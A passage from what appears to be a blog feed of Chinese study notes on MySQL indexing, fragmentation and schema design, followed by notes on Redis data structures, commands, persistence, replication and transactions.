ENGINE=INNODB;</code></li><li>将数据导出一份，然后再重新导入。</li><li>使用第三方工具</li><li>如果损坏的是系统区域，或者是表的”行数据”区域，而不是索引，那么之前的办法就没有用了。只能从备份中恢复表，或者尝试从损坏的数据文件中尽可能恢复数据。</li></ul></li><li><p>如果InnoDB引擎的表出现了损坏，那么一定是发现了严重的错误，需要立刻调查下原因。因为InnoDB的设计一般不会出现损坏。如果发生损坏，可能是数据库的硬件问题，或者在MySQL外部操作了数据文件，亦或是InnoDB的缺陷(不太可能)。不存在任何查询让InnoDB损坏。</p><ul><li>如果出现了数据损坏，最重要的是找出原因，而不是简单的修复，否则很有可能会不断的损坏。可以通过设置innodb_force_recovery参数进入InnoDB的强制恢复数据模式来修复数据。</li></ul></li></ul><h3 id="更新索引统计信息"><a href="#更新索引统计信息" class="headerlink" title="更新索引统计信息"></a>更新索引统计信息</h3><ul><li><p>MySQL的查询优化器通过两个API来了解存储引擎的索引值分布信息：</p><ul><li>records_in_range()，通过传入两个边界值获取在这个范围大概有多少条记录。对某些存储引擎如MyISAM返回精确值，对InnoDB返回一个估算值。</li><li>info()，返回各种类型的数据，包括索引的基数(每个键值有多少条记录)</li></ul></li><li><p>如果存储引擎向优化器提供的扫描行数信息是不准确的数据，或者执行计划本身太复杂而无法精确地获取各个阶段匹配的行数，那么优化器会使用索引统计信息来估算扫描行数。</p></li><li><p>MySQL优化器使用的是基于成本的模型，而衡量成本的主要指标就是一个查询需要扫描多少行。如果表没有统计信息，或者统计信息不准确，优化器很可能做出错误的决定。通过运行ANALYZE TABLE来重新生成统计信息解决这个问题。而每种存储引擎实现的统计信息的方式不同，需要进行ANALYZE TABLE的频率和每次运行的成本也不同：</p><ul><li>Memory引擎根本不存储索引统计信息</li><li>MyISAM将索引统计信息存储在磁盘中，ANALYZE TABLE需要进行一次全索引扫描来计算索引基数，在整个过程中需要锁表。</li><li>直到MySQL5.5版本，InnoDB也不在磁盘存储索引统计信息，而是通过随机的索引访问进行评估并将其存储在内存中。</li></ul></li><li><p>使用<code>SHOW INDEX FROM table;</code>命令来查看索引的基数(cadinality)。基数显示了存储引擎估算索引列有多少个不同的取值。在MySQL5.0及以后的版本，可以通过INFORMATION_SCHEMA.STATISTICS表很方便地查询到这些信息，不过如果服务器的库表非常多，从这里获取元数据的速度会非常慢，而且会给MySQL带来额外的压力。</p></li><li><p>InnoDB的统计信息：</p><ul><li>该引擎通过抽样的方式来计算统计信息，首先随机地读取少量的索引页面，然后以此为样本计算索引的统计信息。老版本中样本页数是8，新版本可以设置innodb_stats_sample_pages来设置样本页的数量。理论上越大的值可以帮助生成更准确的索引信息，特别是对某些超大数据表来说。</li><li>会在表首次打开，或者执行ANALYZE TABLE，抑或表的大小发生非常大的变化(该变化超过十六分之一或者新插入20亿行)的时候计算索引的统计信息。</li><li>会在打开某些INFORMATION_SCHEMA表，或者使用SHOW TABLE STATUS和SHOW INDEX，抑或MySQL客户端开启自动补全功能的时候都会触发索引统计信息的更新。</li><li>如果服务器上有大量的数据，可能会导致严重的问题，尤其是IO比较慢的时候，客户端或者监控程序触发索引信息采样更新时可能会导致大量的锁，并给服务器带来额外的压力。可以关闭innodb_stats_on_metadata参数来避免上面提到的问题。</li></ul></li></ul><h3 id="减少索引和数据的碎片"><a href="#减少索引和数据的碎片" class="headerlink" title="减少索引和数据的碎片"></a>减少索引和数据的碎片</h3><ul><li><p>索引碎片化：</p><ul><li>B-Tree索引可能会碎片化，这会降低查询的效率。碎片化的索引可能会以很差或者无序的方式存储在磁盘上。</li><li>根据设计，B-Tree需要随机磁盘访问才能定位到叶子页，所以随机访问是不可避免的。然而，如果叶子页在物理分布上是顺序且紧密的，那么查询的性能就会更好。否则对于范围查询、索引覆盖扫描等操作来说，速度可能会降低很多倍；对于索引覆盖扫描这一点更明显</li></ul></li><li><p>表的数据存储碎片化(比索引碎片化更加复杂)：</p><ul><li><p>类型：</p></li><li><p>行碎片(Row fragmentation)：数据行被存储为多个地方的多个片段中。及时查询只从索引中访问一行记录，也会导致性能下降。</p></li><li>行间碎片(Intra-row fragmentation)：指逻辑上顺序的页，或者行在磁盘上不是顺序存储的。行间碎片对诸如全表扫描和聚簇索引扫描之类的操作有很大的影响，因为这些操作原本能够从磁盘上的顺序存储的数据收益。</li><li><p>剩余空间碎片(Free space fragmentation)：数据页中有大量的空余空间。这会导致服务器读取大量不需要的数据，造成浪费。</p></li><li><p>对MyISAM表，这三类碎片化都可能发生；但InnoDB不会出现短小的行碎片，它会移动短小的行并重写到一个片段中。</p></li></ul></li><li><p>重新整理数据方式：</p><ul><li>OPTIMIZE TABLE</li><li>导出再导入</li><li>排序算法重建索引(针对MyISAM)</li><li>“在线”添加和删除索引的功能，可以通过先删除，然后在重新创建索引来消除索引碎片(针对最新版本InnoDB)</li><li>通过一个不做任何操作的<code>ALTER TABLE &amp;lt;table&amp;gt; ENGINE = &amp;lt;engine&amp;gt;;</code>来重建表(针对不支持OPTIMIZE TABLE的引擎)</li></ul></li><li><p>应该通过一些实际测量而不是随意假设来确定是否需要消除索引和表的碎片化，还要考虑数据是否已达到稳定状态(如果进行碎片整理将数据压缩到一起，可能会导致后续的更新操作触发一系列的页分裂和重组，对性能造成不良的影响直到数据达到新的稳定状态)</p></li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>MySQL和存储引擎访问数据的方式，加上索引的特性，使得索引成为一个影响数据访问的有利而灵活的工作(无论数据实在磁盘还是在内存中)</li><li>大多数情况下都会使用B-Tree索引，其他类型的索引大多只适用于特殊目的。</li><li><p>选择索引和编写利用这些索引的查询时，有如下三个原则始终需要记住：</p><ul><li>单行访问是很慢的。如果服务器从存储中读取一个数据块只是为了获取其中的一行，那么就浪费了很多工作。最好的读取的块中能包含尽可能多需要的行。使用索引可以创建位置引用提高效率。</li><li>按顺序访问范围数据是很快的。有两个原因：顺序IO不需要多次磁盘寻道而比随机IO快很多；如果服务器能够按需要的顺序读取数据，就不再需要额外的排序操作，并且GROUP BY查询也无须再做排序和将行按组进行聚合计算。</li><li>索引覆盖查询是很快的。如果一个索引包含了查询需要的所有列，那么存储引擎就不需要再回表查找行，避免了大量的单行访问。</li></ul></li><li><p>编写查询语句应该尽可能选择合适的索引以避免单行查找，尽可能地使用数据原生顺序而避免额外的数据排序操作，并尽可能使用索引覆盖查询。</p></li><li>对某些查询不可能创建一个“三星”索引，必须要有所取舍，或者寻求替代策略(例如反范式话、或者提前计算汇总表)</li><li>理解索引的工作原理来创建最适合的索引</li><li><p>判断为一个系统创建的索引的合理性：按响应时间对查询进行分析。</p><ul><li>找出那些消耗时间最长的或给服务器带来最大压力的查询</li><li>检查这些查询的schema，SQL和索引结构</li><li>判断是否有查询扫描了太多的行，是否做了很多额外的排序或者使用了临时表，是否使用随机IO访问数据，或者是有太多回表查询那些不在索引中的列的操作。</li></ul></li><li><p>如果一个查询无法从所有可能的索引中获益，则应该看看是否可以创建一个更合适的索引来提升性能。如果不行，也要尝试是否可以重写该查询，将其转化成一个能够高效利用现有索引或者新创建索引的查询。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>高性能mysql学习笔记--schema与数据类型优化</title>
      <link href="/2018/07/02/%E9%AB%98%E6%80%A7%E8%83%BDmysql%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-schema%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E4%BC%98%E5%8C%96/"/>
      <url>/2018/07/02/%E9%AB%98%E6%80%A7%E8%83%BDmysql%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-schema%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E4%BC%98%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p>良好的逻辑设计和物理设计是高性能的基石，应该根据系统将要执行的查询语句来设计schema。<br><a id="more"></a></p><h2 id="选择优化的数据类型"><a href="#选择优化的数据类型" class="headerlink" title="选择优化的数据类型"></a>选择优化的数据类型</h2><h3 id="1-整数类型"><a href="#1-整数类型" class="headerlink" title="1.整数类型"></a>1.整数类型</h3><ul><li>TINYINT 8位</li><li>SMALLINT 16位</li><li>MEDIUMINT 24位</li><li>INT 32位</li><li>GININT 64位</li></ul><p>注意：</p><p>整数还有可选的UNSIGNED属性，表示不允许负值，例如TINYINT UNSIGNED可以存储的范围是0~255 而TINYINT的存储范围是-128~127</p><p>MySQL可以为证书类型指定宽度，例如int(1),int(11),但是这对大多数应用是没有意义的，他不会限制值的合法范围。</p><h3 id="2-实数类型"><a href="#2-实数类型" class="headerlink" title="2.实数类型"></a>2.实数类型</h3><p>实数是带有小数部分的数字</p><ul><li>DECIMAL类型用于存储精确的小数，浮点类型在存储同样范围的值时，通常比DECIMAL使用更少的空间，</li><li>只在对小数进行精确计算时才使用decimal，数据量比较大的时候，使用BIGINT来代替，乘以相应的倍数</li></ul><h3 id="3-字符串类型"><a href="#3-字符串类型" class="headerlink" title="3.字符串类型"></a>3.字符串类型</h3><p>1） VARCHAR和CHAR是主要的字符串类型</p><ul><li>适合使用VAGCHAR类型（VARCHAR还需要1或者2个额外字节来记录字符串的长度）<br>字符串的最大长度比平均长度大很多，列的更新很少</li><li><p>适合使用CHAR类型<br>适合存储很短的字符串或者所有值都接近同一个长度，经常变更的数据</p><p>与上述相同的类型还有BINARY和VARBINARY,存储的是二进制字符串，存储的是字节码<br>二进制比较的优势体现在(1）无大小写敏感，每次按一个字节进行比较，所以速度比字符比较简单很多</p></li></ul><p>2）BLOB（采用二进制）和TEXT（字符方式）类型<br>都是为存储很大的数据而设计的字符类型</p><p>尽量避免使用这两种类型，如果使用到，使用字符截取来使用SUBSTRING</p><h3 id="4-使用枚举（ENUM）代替字符串类型"><a href="#4-使用枚举（ENUM）代替字符串类型" class="headerlink" title="4.使用枚举（ENUM）代替字符串类型"></a>4.使用枚举（ENUM）代替字符串类型</h3><p>枚举列可以把一些不重复的字符胡灿存储成一个预定义的集合</p><ul><li>枚举实际存储为证书，而不是字符串</li><li>字段排序使用内部存储的证书而不是定义的字符串，可以使用FILED进行显示指定排序</li><li>适合固定的字符串列表。</li></ul><h3 id="5-日期和时间类型"><a href="#5-日期和时间类型" class="headerlink" title="5.日期和时间类型"></a>5.日期和时间类型</h3><p>DATETIME 1001~9999 精度为秒 8个字节 与时区无关<br>TIMESTAMP 1970~2038 4个字节 依赖时区，没有指定值的时候，MySQL会设置当前时间</p><p>除了特殊行为之外，尽量使用TIMESTAMP</p><h3 id="6-位数据类型"><a href="#6-位数据类型" class="headerlink" title="6.位数据类型"></a>6.位数据类型</h3><ul><li>BIT</li><li>SET<br>尽量不使用这种类型</li></ul><h2 id="范式和反范式"><a href="#范式和反范式" class="headerlink" title="范式和反范式"></a>范式和反范式</h2><h3 id="1-数据库第一范式，第二范式、第三范式"><a href="#1-数据库第一范式，第二范式、第三范式" class="headerlink" title="1.数据库第一范式，第二范式、第三范式"></a>1.数据库第一范式，第二范式、第三范式</h3><ul><li>第一范式:确保每列的原子性(强调的是列的原子性，即列不能够再分成其他几列).如果每列(或者每个属性)都是不可再分的最小数据单元(也称为最小的原子单元),则满足第一范式.<br>例如:顾客表(姓名、编号、地址、……)其中”地址”列还可以细分为国家、省、市、区等。</li></ul><ul><li><p>第二范式:在第一范式的基础上更进一层,目标是确保表中的每列都和主键相关(一是表必须有一个主键；二是没有包含在主键中的列必须完全依赖于主键，而不能只依赖于主键的部分)<br>如果一个关系满足第一范式,并且除了主键以外的其它列,都依赖于该主键,则满足第二范式.<br>例如:订单表(订单编号、产品编号、定购日期、价格、……)，”订单编号”为主键，”产品编号”和主键列没有直接的关系，即”产品编号”列不依赖于主键列，应删除该列。</p></li><li><p>第三范式:在第二范式的基础上更进一层,目标是确保每列都和主键列直接相关,而不是间接相关(另外非主键列必须直接依赖于主键，不能存在传递依赖).<br>如果一个关系满足第二范式,并且除了主键以外的其它列都不依赖于主键列,则满足第三范式.<br>了理解第三范式，需要根据Armstrong公里之一定义传递依赖。假设A、B和C是关系R的三个属性，如果A-〉B且B-〉C，则从这些函数依赖中，可以得出A-〉C，如上所述，<br>依赖A-〉C是传递依赖。例如:订单表(订单编号，定购日期，顾客编号，顾客姓名，……)，初看该表没有问题，满足第二范式，每列都和主键列”订单编号”相关，再细看你会发现”顾客姓名”和”顾客<br>编号”相关，”顾客编号”和”订单编号”又相关，最后经过传递依赖，”顾客姓名”也和”订单编号”相关。为了满足第三范式，应去掉”顾客姓名”列，放入客户表中。</p></li></ul><h3 id="2-范式化的优点和缺点"><a href="#2-范式化的优点和缺点" class="headerlink" title="2.范式化的优点和缺点"></a>2.范式化的优点和缺点</h3><ul><li><p>优点是在写密集的场景，更新操作快，表更小，很少有冗余的数据，更少的需要DISTINCT或者GROUPBY</p></li><li><p>范式化的设计的schema的缺点通常是需要关联，代价昂贵，也可能使一些索引策略无效</p></li></ul><h3 id="3-反范式化的有点和缺点"><a href="#3-反范式化的有点和缺点" class="headerlink" title="3.反范式化的有点和缺点"></a>3.反范式化的有点和缺点</h3><ul><li>优点是可以避免关联</li><li>增加表/或者字段保存冗余数据</li></ul><h3 id="4-混用范式化和反范式化"><a href="#4-混用范式化和反范式化" class="headerlink" title="4.混用范式化和反范式化"></a>4.混用范式化和反范式化</h3><p>单独使用一种都是理想化的东西，在真实世界很少有这么极端的使用</p><h2 id="缓存表和汇总表"><a href="#缓存表和汇总表" class="headerlink" title="缓存表和汇总表"></a>缓存表和汇总表</h2><p>有时候提升性能最好的方法是在同一张表中保存衍生的冗余数据，有时候也需要创建一张完全独立的汇总表或者缓存表</p><ul><li>缓存表<br>表示存储那些可以比较简单地从schema其他白表获取（但是每次获取的速度比较慢）数据的表</li></ul><p>例子：<br>需要计算一个网站24小时发送的消息树，在一个很繁忙的网站不可能维护一个实时准确的计数器，作为替代方案，可以每小时生成一张汇总表，这样一条简单的查询就可以做到<br>可以避免扫描大数据信息表的所有行</p><ul><li>汇总表<br>保存的是使用GROUP BY 语句聚合数据的表</li></ul><p>注：<br>当重建汇总表和缓存表时候，通常需要保证数据在操作时依然可用，这就需要通过影子表来实现</p><p>影子表指的是在一张真实表背后创建的表，复制来表为新表，并把新表当老表，一旦新表数据有问题，可以快速的进行回滚操作</p><h2 id="计数器表"><a href="#计数器表" class="headerlink" title="计数器表"></a>计数器表</h2><p>如果在应用中保存计数器，则在更新计数器时可能碰到并发问题，则计数器表在web应用中很常见，比如，可以用缓存缓存一个用户的朋友数量，文件下载次数，创建一张独立的表存储技术器是个好主意</p><p>因为计数器更新操作很多，这条记录都有一个全局的互斥锁，如果要获得更高的并发性能，可以将计数器保存在多行中，每次随机选择一行进行更新</p><h2 id="加快ALTER-TABLE操作的速度"><a href="#加快ALTER-TABLE操作的速度" class="headerlink" title="加快ALTER TABLE操作的速度"></a>加快ALTER TABLE操作的速度</h2><p>表重建的操作</p><ul><li>现在一台不提供服务的机器上执行更改操作，然后与提供服务的主库进行切换</li><li>影子拷贝，创建一张和原表无关的新表，通过重命名和删表操作交换两张表</li></ul><p>不重建表的操作<br>更改或者删除的列的默认值</p><ul><li>使用ALTER COLUMN操作来改表列的默认值</li></ul><p>只修改.frm操作（非官方文档）<br>下列这些操作有可能不需要重建表</p><ul><li>移除一个列的AUTO_INCREMENT属性</li><li>增加，移除或者更改ENUM或者SET常量</li></ul><p>基本的技术是为想要的表结构创建一个新的.frm文件，然后用他替换掉已经存在的那张表的.frm文件</p><p>像下面这样<br>1）创建一张有相同结构的空表，并进行所需要的修改<br>2）执行flush tables with read lock 关闭所有正在使用的表，禁止读操作<br>3）交换.frm文件<br>4）执行 unlock tables 释放读锁</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>良好的简单schema设计原则是普遍适用的</p><ul><li>使用小而简单的合适数据类型，除非真实数据模型有确切的需要，否则应该尽可能的避免使用NULL值</li><li>尽量使用相同的数据类型存储相似或者相关的值，特别是在关联条件中使用的列</li><li>注意可变字符串，其在临时表和排序时可能导致悲观的按最大长度分配内存</li><li>尽量使用整型定义标识列</li><li>范式十号，但是反范式（虽然意味着重复数据），有时也是必须的，并且能够带来好处</li><li>最后，更改表操作是让人痛苦的，大部分情况下，都会锁表并且重建整张表</li></ul>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Redis基础-数据结构与常用操作命令</title>
      <link href="/2018/07/02/redis%E5%9F%BA%E7%A1%80-%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4/"/>
      <url>/2018/07/02/redis%E5%9F%BA%E7%A1%80-%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<p>Redis是一个速度非常快的非关系数据库，它可以存储键与5种不同类型的值之间的映射，可以将存储在内存的键值对数据持久化到硬盘，可以使用复制特性来扩展读性能，还可以使用客户端分片来扩展性能</p><a id="more"></a><p>数据结构简介</p><h2 id="STRING-字符串"><a href="#STRING-字符串" class="headerlink" title="STRING(字符串)"></a>STRING(字符串)</h2><p>可以存储字符串，整数或者浮点数</p><ul><li>字符串命令<br>1)GET 获取存储在给定键中的值<br>2)SET 设置存储在给定键中的值<br>3)DEL 删除存储在给定键中的值（这个命令可以用于任何类型）</li></ul><ul><li><p>自增/自减操作<br>1）INCR key-name<br>2）DECR KEY-name<br>3) INCRBY key-name amount<br>4）DECRBY key-name amount<br>5)incrbyfloat key-name amount</p></li><li><p>处理子串和二进制位的命令<br>1）APPEND key-name value 将值追加到给定键key-name当前存储的值的末尾<br>2）GETRANGE key-name start end 获取偏移量范围内的子串<br>3）SETANGE key-name offset value start开始设置为给定值<br>4）GETBIT key-name offset  返回位串中偏移量为offset的二进制位的值<br>5）SETBIT key-name offset value<br>6）BITCOUNT key-name统计二进制位串里面值为1的二进制位的数量</p></li></ul><h2 id="LIST-列表"><a href="#LIST-列表" class="headerlink" title="LIST(列表)"></a>LIST(列表)</h2><p>存储一个链表，链表上的每个节点都包含了一个字符串</p><ul><li><p>常用命令<br>1）RPUSH key-name value 将给定值推入列表的右端<br>2）LPUSH key-name value 将给定值推入列表的左端<br>3）LRANGE key-name start end 获取列表在给定范围上的所有值<br>4）LINDEX key-name index 获取列表在给定位置上的单个元素<br>5）LPOP key-name 从列表的左端弹出一个值，并返回被弹出的值<br>6）LTRIM key-name start end 只保留从start偏移量到end偏移量范围内的元素</p></li><li><p>阻塞式的列表弹出命令以及在列表之间移动元素的命令<br>1）BLPOP key-name timeout 从第一个非空列表中弹出位于最左端的元素，或者在timeout秒之内阻塞并等待可弹出的元素出现<br>2）BRPOP 同上<br>3）RPOPLPUSH source-key dest-key 从source-key列表中弹出位于最右端的元素，然后将这个元素推入dest-key列表的最左端，并向用户返回这个元素<br>4）BRPOPLPUSH source-key dest-key 从source-key列表中弹出位于最右端的元素，然后将这个元素推入dest-key列表的最左端，并向用户返回这个元素，如果source-key为空，则在timeout秒之内阻塞并等待可弹出的元素出现</p></li></ul><h2 id="SET-集合"><a href="#SET-集合" class="headerlink" title="SET(集合)"></a>SET(集合)</h2><p>包含字符串的无序收集器，并且被包含的每个字符串都是独一无二的</p><ul><li><p>常用命令<br>1）SAD key-name item 将给定元素添加到集合<br>2）SMEMBERS key-name 返回集合包含的所有元素<br>3）SISMEMBER key-name item检查给定元素是否存在于集合中<br>4）SREM key-name item  如果给定的元素存在于集合中，那么移除这个元素<br>5）SCARD key-name 返回集合包含的元素的数量</p></li><li><p>用于组合和处理多个集合的Redis命令<br>1）SDIFF key-name 求差集，只存在第一个集合，不存在其他集合中的元素<br>2）SDIFFSTORE dest-key keyname 差集放到dest-key中<br>3）SINTER key-name 交集<br>4）SINTERSTORE dest-key keyname 交集放到dest-key中<br>5）SUNION keyname keyname 并集<br>6）SUNIONSTORE dest-key key-name 将并集放到dest-key中去</p></li></ul><h2 id="HASH-哈希"><a href="#HASH-哈希" class="headerlink" title="HASH(哈希)"></a>HASH(哈希)</h2><p>包含键值对的无序散列表</p><ul><li><p>用于添加和删除键值对的散列操作<br>1）HMGET key-name key 从散列获取键的值<br>2）HMSET KEY-name key value 为散列里面的一个或多个建设置值<br>3）HDEL kye-name key 删除散列里面的一个或多个键值对<br>4）HLEN key-name 返回散列包含的键值对数量</p></li><li><p>散列高级特性操作<br>1）HEXISTS key-name key 检查给定键是否存在于散列中<br>2）HEKYS key-name 获取散列包含的所有键<br>3）HVALS key-name 获取散列包含的所有值<br>4）HGETALL key-name 获取散列包含的所有键值对<br>5) HINCRBY key-name key increment 将key存储的值加上证书increment<br>6）HINCRBYFLOAT key-name key increment key存储的值加上increment</p></li></ul><h2 id="ZSET-有序集合"><a href="#ZSET-有序集合" class="headerlink" title="ZSET(有序集合)"></a>ZSET(有序集合)</h2><p>字符串成员与浮点数分值的有序映射，元素的排列顺序由分支的大小决定</p><ul><li><p>常用的有序集合命令<br>1）ZADD key-name score member 添加给定分值的成员到有序集合里面<br>2）ZREM key-name member 从有序集合里面移除指定的成员<br>3）ZCARD key-name 返回有序集合包含的成员数量<br>4）ZINCRBY key-name increment meber 将member成员的分值加上increment<br>5)ZCOUNT key-name min max 返回分值介于min和max之间的成员数量<br>6）ZRANK key-name member 返回成员member在有序集合的排名<br>7）ZSCORE key-name member 返回成员的分值<br>8）ZRANGE key-name start stop 返回有序集合中排名介于ustart和stop之间的成员</p></li><li><p>有序集合范围型数据获取命令和范围型数据删除命令以及并集命令和交集命令<br>1）ZREVRANK key-name member 返回有序集合里成员的排名，按照从大到小排名<br>2）ZREVRANGE key-name start stop 返回有序集合里给定排名范围内的成员，成员按照从大到小排列<br>3）ZRANGEBYSCORE key min max 返回有序集合中，分支介于min和max之间的所有成员<br>4）ZREVRANGEBYUSCORE key min max 获取有序集合中分值介于min和max之间的所有成员 并按照分值从大到小来返回<br>5）ZREMRANGEBYRANK key-name start stop 移除有序集合中排名介于start和start之间的所有成员<br>6）ZREMRANGEBYSCORE key-name min max 移除有序集合中分值介于min和max之间的所有成员<br>7) ZINTERSTORE dest-key key-count key 对给定的有序集合执行类似于集合的交集运算<br>8）ZUNIONSTORE dest-key key-count key 对给定的有序集合执行类似于集合的并集运算</p></li></ul><h2 id="发布和订阅命令"><a href="#发布和订阅命令" class="headerlink" title="发布和订阅命令"></a>发布和订阅命令</h2><p>发布与订阅的特点是，订阅者负责订阅频道，发送者负责向频道发送二进制字符串消息，每当有消息被发送至给定频道时，频道的所有订阅者都会受到消息</p><p>Redis提供的发布与订阅命令<br>1)SUBSCRIBE channel1 订阅给定的一个或多个频道<br>2）UNSUBSCRIBE channel1 退订给定的一个或多个频道，如果执行没有给定任何频道，那么退订所有频道<br>3）PUBLISH channel message 向给定的频道发送消息<br>4）PSUBSCRIBE pattern 订阅与给定模式相匹配的所有频道<br>5）PUNSUBSCRIBE pattern 退订给定的模式，如果执行时没有给定任何模式，那么退订所有模式</p><h2 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h2><ul><li>命令<br>SORT source-key </li></ul><h2 id="事务"><a href="#事务" class="headerlink" title="事务"></a>事务</h2><ul><li>命令<br>MULTI EXEC 被这两个命令包裹的指令都会一个接一个的执行，知道所有命令都执行完毕。</li></ul><h2 id="键的过期时间"><a href="#键的过期时间" class="headerlink" title="键的过期时间"></a>键的过期时间</h2><p>在使用Redis存储数据的时候，有些数据可能在某个时间点之后就不再游泳了，用户可以使用DEL命令显式的删除这些无用数据，也可以通过Redis的国企时间特性来让一个键在给定时限后自动被删除，</p><ul><li>用于处理过期时间Redis命令<br>1） PERSIST key-name 移除键的过期时间<br>2） TTL key-name 查看给定键距离过期还有多少秒<br>3） EXPIRE key-name seconds 让给定键在指定的秒数之后过期<br>4)  EXPIREAT key-name timestamp 将给定键的过期时间设置为给定的UNIX时间戳<br>5） PTTL key-name 查看给定键距离过期时间还有多少毫秒<br>6） PEXPIRE key-name milliseconds 让给定键在指定的毫秒数之后过期<br>7） PEXPIREAT key-name timestamp-milliseconds 将一个毫秒级精确度的UNIX时间戳设置为给定的过期时间</li></ul><h1 id="持久化"><a href="#持久化" class="headerlink" title="持久化"></a>持久化</h1><p>Redis提供了两种不同的持久化方法来将数据存储到硬盘里面,将内存中的数据存储到硬盘的一个主要原因是为了在之后重用数据，或者是为了防止系统故障而降数据备份到一个元和才能位置</p><h2 id="快照"><a href="#快照" class="headerlink" title="快照"></a>快照</h2><p>通过创建快照来获得存储在内存里面的数据在某个时间的上副本，在创建快照之后，用户可以兑快照进行备份，可以将快照复制到其他服务器创建副本，</p><h2 id="创建快照的几个方法"><a href="#创建快照的几个方法" class="headerlink" title="创建快照的几个方法"></a>创建快照的几个方法</h2><ul><li><p>客户端可以通过Redis发送BGSAVE来创建一个快照，开启子进程创建快照</p></li><li><p>SAVE命令，阻塞主进程，不常用，没有足够内存使用BGSAVE才使用</p></li><li><p>只追加文件 append-only file（AOF）</p></li><li><p>配置选项 如save 60 10000，60秒内有10000次插入</p></li><li><p>SHUTDOWN命令</p></li><li><p>一个Redis服务连接另一个Redis服务器，并向对方发送SYNC命令开始一次复制操作的时候</p></li></ul><h2 id="适用范围"><a href="#适用范围" class="headerlink" title="适用范围:"></a>适用范围:</h2><p>快照持久化只适用于那些即使丢失一部分数据也不会造成问题的应用程序</p><h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><ul><li><p>个人开发</p></li><li><p>对日志进行聚合计算</p></li><li><p>大数据</p></li></ul><h2 id="AOF持久化"><a href="#AOF持久化" class="headerlink" title="AOF持久化"></a>AOF持久化</h2><p>AOF持久化会将被执行的写明了另写到AO文件的末尾，以此来记录数据发生的变化，因此，Redis主要从头到尾重新执行以此AOF文件包含的所有写命令，就可以恢复AOF文件记录的数据集</p><p>通过设置appendsync always/everysec/no 来设置命令写入的频率，通过每秒的同步一次AOF文件，Redis可以保证，即使出现系统奔溃，用户也最多只会丢失一秒之内产生的数据</p><h2 id="重写压缩文件"><a href="#重写压缩文件" class="headerlink" title="重写压缩文件"></a>重写压缩文件</h2><p>AOF虽然可以保证数据，但是不断被执行的写命令记录到AOF文件中，文件的体积会越来越大，占用可用文件，</p><p>使用命令BGREWITEAOF移除AOF文件中的冗余命令来重写</p><h1 id="复制"><a href="#复制" class="headerlink" title="复制"></a>复制</h1><p>复制可以让其他服务器拥有一个不断更新的数据副本，从而使用的拥有数据副本的服务器可以用于处理客户端发送的读请求，</p><p>单机处理请求的能力有限，可以使用复制从服务器来帮助处理客户端的请求和压力，即达到负载均衡。</p><h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><ul><li>创建从服务器</li></ul><p>slaveof host port</p><ul><li>终止复制</li></ul><p>slaveof no one</p><h2 id="复制的启动过程"><a href="#复制的启动过程" class="headerlink" title="复制的启动过程"></a>复制的启动过程</h2><p>主服务器接受到从服务器的请求时候，生成快照文件，同时在缓冲区记录这区间的Redis执行的写命令，然后发送快照文件以及缓冲区命令给从服务器，最后，每执行一个写命令，就向从服务器发送相同的写命令。</p><p>注意：</p><ul><li><p>从服务器进行同步时，会清空自己的所有数据</p></li><li><p>Redis不支持主主复制</p></li></ul><h2 id="主从链"><a href="#主从链" class="headerlink" title="主从链"></a>主从链</h2><h2 id="检验硬盘写入"><a href="#检验硬盘写入" class="headerlink" title="检验硬盘写入"></a>检验硬盘写入</h2><h1 id="处理系统故障"><a href="#处理系统故障" class="headerlink" title="处理系统故障"></a>处理系统故障</h1><h2 id="验证快照文件和AOF文件"><a href="#验证快照文件和AOF文件" class="headerlink" title="验证快照文件和AOF文件"></a>验证快照文件和AOF文件</h2><ul><li><p>Redis-check-aof </p></li><li><p>Redis-check-dump</p></li></ul><h2 id="更换故障主服务器"><a href="#更换故障主服务器" class="headerlink" title="更换故障主服务器"></a>更换故障主服务器</h2><p>更换服务器，生成快照文件，发送新的主服务器，将其他从属关系重新配置</p><h1 id="Redis事务"><a href="#Redis事务" class="headerlink" title="Redis事务"></a>Redis事务</h1><p>为了保证数据的正确性，在多个客户端同事处理相同的数据时，不谨慎的操作很容易会导致数据错误，这时候就要用到事务了，Redis的事务跟关系型数据库的事务不一样，关系数据库会对呗访问的数据进行加锁，直到事务被提交或者被回滚为止，如果有其他客户端试图对加锁的数据行进行写入，那么该客户端会被阻塞，直到第一个事务执行完毕，因为加锁有可能会造成长时间的等待，所以Redis为了尽可能的减少客户端的等待时间，并不会对数据进行加锁，Redis采用的是乐观锁，数据被其他客户端抢先修改了情况，通知执行了watch命令的客户端。</p><ul><li>命令<br>MULIT 类似于关系数据库的BEGIN</li></ul><p>EXEC 类似于关系数据库的commit</p><p>WATCH 对需要监控的键进行监控，如果键被修改，则会抛出WATCHERROR</p><p>UNWATCH 取消监控，在watch命令执行之后，MULI命令执行之前对连接池进行重置</p><p>DISCARD 在MULI命令执执行之后，EXEC执行之前对连接池进行重置。</p><h1 id="非事务型流水线"><a href="#非事务型流水线" class="headerlink" title="非事务型流水线"></a>非事务型流水线</h1><p>在需要执行大量命令的情况下即使命令实际上并不需要放在事务里面执行，但是为了通过一次发送所有命令来减少通信次数并降低延迟值，用户也可能将命令包裹在MULTI 和EXEC里面执行，但是事务会消耗资源，并且可能会导致其他重要的命令被延迟执行，</p><p>pipelin(false)<br>…命令<br>pipe.exeute</p><h1 id="性能测试"><a href="#性能测试" class="headerlink" 